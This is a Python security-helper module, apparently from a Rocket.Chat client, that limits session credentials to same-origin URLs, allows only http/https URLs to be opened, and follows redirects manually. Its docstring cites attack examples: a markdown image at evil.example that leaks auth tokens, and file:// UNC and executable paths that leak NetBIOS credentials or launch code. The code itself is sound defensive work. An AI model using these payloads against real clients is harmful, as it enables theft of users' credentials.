"""出网请求与「用系统程序打开」的 URL 守卫。

聊天窗口里的 URL 全部来自服务器或他人消息，不能当可信输入直接用：

- 会话凭据（`X-Auth-Token` / `X-User-Id` / `rc_*` Cookie）只允许发给同源
  地址。否则一条 `![x](https://evil.example/1.png)` 就能把令牌送到攻击者
  主机——Rocket.Chat 的图片/头像加载器会「顺手」给每个请求带认证头。
- 交给系统默认程序打开的 URL 只放行 http/https。Windows 上
  `QDesktopServices.openUrl` 走 `ShellExecute`，`file://unc/attacker/x`
  会外泄 NetBIOS 认证、`file://C:/…/evil.exe` 可直接落地执行。
- 下载的重定向逐跳自己跟（`redirect_target`）：requests 的自动跟随只剥
  `Authorization`，`X-Auth-Token`/`Cookie` 会原样送到跳转目标主机。
"""
from __future__ import annotations

from urllib.parse import urljoin, urlsplit

_WEB_SCHEMES = ("http", "https")
_REDIRECT_STATUSES = (301, 302, 303, 307, 308)
MAX_REDIRECT_HOPS = 5


def _as_text(url) -> str:
    """统一取字符串：非字符串（没打桩干净的假对象、None）按空处理。

    这里宁可判成「不同源」少带凭据，也不能因为类型意外把槽函数炸掉。
    """
    return url.strip() if isinstance(url, str) else ""


def is_openable_url(url: str) -> bool:
    """能否把 url 交给系统默认程序打开（只放行 http/https）。"""
    text = _as_text(url)
    if not text:
        return False
    return urlsplit(text).scheme.lower() in _WEB_SCHEMES


def _origin(url: str):
    """(scheme, host, port) 三元组；省略默认端口，让 :443 与裸主机名等价。"""
    parts = urlsplit(_as_text(url))
    scheme = parts.scheme.lower()
    try:
        port = parts.port
    except ValueError:
        return None          # 端口写法畸形（host:abc）
    if port is None:
        port = 443 if scheme == "https" else 80
    host = (parts.hostname or "").lower()
    if not host:
        return None
    return scheme, host, port


def same_origin(url: str, server_url: str) -> bool:
    """url 与 server_url 是否同源（scheme + host + port，大小写不敏感）。

    相对路径（Rocket.Chat 附件常见的 `/file-upload/…`）视为同源：调用方
    一般已按 server_url 补全，没补全的那次也不能因为「它是相对路径」就把
    认证头丢掉。
    """
    text = _as_text(url)
    if not text:
        return False
    if text.startswith("/"):
        return True
    got = _origin(text)
    if got is None or got[0] not in _WEB_SCHEMES:
        return False
    want = _origin(server_url)
    return got == want


def can_carry_credentials(url: str, server_url: str) -> bool:
    """这个请求能否带上会话凭据。

    没有配置服务器地址时无从判定同源（登录前、单测里的裸加载器），只要求
    是 Web 协议——至少不给 `file://` 之类挂凭据；其余情况严格判同源。
    """
    text = _as_text(url)
    if not text:
        return False
    if not _as_text(server_url):
        return text.startswith("/") or is_openable_url(text)
    return same_origin(text, server_url)


def is_redirect(status) -> bool:
    """状态码是否是「该跟着跳一次」。非整数（假响应对象）一律 False。"""
    return isinstance(status, int) and status in _REDIRECT_STATUSES


def redirect_target(resp, base_url: str) -> str:
    """3xx 响应要跳转到的绝对 URL；不是重定向、没给 Location 或协议不是
    http/https 时返回空串（调用方据此把响应当最终结果处理）。

    只读 status_code / headers，不依赖 requests，方便直接喂假响应单测。
    """
    if not is_redirect(getattr(resp, "status_code", None)):
        return ""
    headers = getattr(resp, "headers", None)
    if not isinstance(headers, dict):
        return ""
    text = str(headers.get("Location", "") or "").strip()
    if not text:
        return ""
    base = _as_text(base_url)
    if not base:
        return ""
    target = urljoin(base, text)
    return target if is_openable_url(target) else ""
